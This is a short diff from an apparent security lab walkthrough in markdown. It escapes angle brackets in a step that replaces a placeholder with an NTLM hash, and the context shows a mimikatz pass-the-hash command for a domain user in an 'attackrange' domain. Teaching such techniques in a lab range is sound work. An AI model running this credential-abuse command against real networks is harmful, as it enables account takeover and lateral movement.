@@ -132,7 +132,7 @@ While still in `mimikatz` we can use that hash of the domain user (`ATTACKRANGE\
 
 **Step 10**
 > [!IMPORTANT]
-> Replace <NTLM-hash> with the real sting obtained from the previous step
+> Replace \<NTLM-hash\> with the real sting obtained from the previous step
 
 ```PowerShell
 [ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell
